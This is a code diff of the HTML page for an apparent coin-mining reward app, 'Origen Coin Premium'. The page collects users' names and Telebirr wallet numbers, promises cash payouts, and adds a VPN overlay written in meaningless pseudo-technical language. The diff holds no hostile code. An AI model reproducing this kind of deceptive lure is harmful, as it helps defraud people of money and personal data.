@@ -5,9 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Origen Coin Premium</title>
     <link rel="stylesheet" href="style.css">
-    
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
-    
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
@@ -21,7 +19,7 @@
             <p>Connect your Telebirr wallet account to mine coins and claim cash payouts.</p>
             
             <div class="input-group">
-                <input type="text" id="login-name" placeholder="Full Name" required>
+                <input type="text" id="login-name" placeholder="Full Name" autocomplete="off" required>
             </div>
             <div class="input-group">
                 <input type="tel" id="login-phone" placeholder="Telebirr Number (e.g., 09...)" required>
@@ -49,7 +47,7 @@
                 <div class="balance-wrapper">
                     <p class="balance-label">TOTAL MINED BALANCE</p>
                     <div class="main-balance">
-                        <svg class="balance-coin-icon" viewBox="0 0 24 24" width="40" height="40"><circle cx="12" cy="12" r="10" fill="#ffcc00"/><path d="M12 17a5 5 0 1 0 0-10 5 5 0 0 0 0 10z" fill="#ff9900"/><text x="12" y="15.5" font-family="'Poppins'" font-weight="800" font-size="10" fill="#fff" text-anchor="middle">O</text></svg>
+                        <svg class="balance-coin-icon" viewBox="0 0 24 24" width="36" height="36"><circle cx="12" cy="12" r="10" fill="#ffcc00"/><path d="M12 17a5 5 0 1 0 0-10 5 5 0 0 0 0 10z" fill="#ff9900"/><text x="12" y="15.5" font-family="'Poppins'" font-weight="800" font-size="10" fill="#fff" text-anchor="middle">O</text></svg>
                         <h1 id="coin-balance-display">0</h1>
                     </div>
                 </div>
@@ -144,9 +142,29 @@
                 <span class="nav-text">Wallet</span>
             </button>
         </nav>
-
     </div>
 
-    <script src="script.js"></script>
+    <div id="global-modal" class="global-modal hidden">
+        <div class="modal-card">
+            <div id="modal-icon" class="modal-icon">⚡</div>
+            <h2 id="modal-title">Notification</h2>
+            <p id="modal-message">Message details loading...</p>
+            <button id="modal-btn">Continue</button>
+        </div>
+    </div>
+
+    <div id="vpn-overlay" class="vpn-overlay hidden">
+        <div class="vpn-card">
+            <div class="vpn-icon">⚠️</div>
+            <h2>TURN ON VPN</h2>
+            <p>To unlock high-yield global premium tasks, routing containers require outside network pipelines.</p>
+            <ul>
+                <li>1. Minimize this application panel.</li>
+                <li>2. Connect your VPN to an international endpoint.</li>
+                <li>3. Return immediately back here to extract points.</li>
+            </ul>
+        </div>
+    </div>
+
 </body>
 </html>
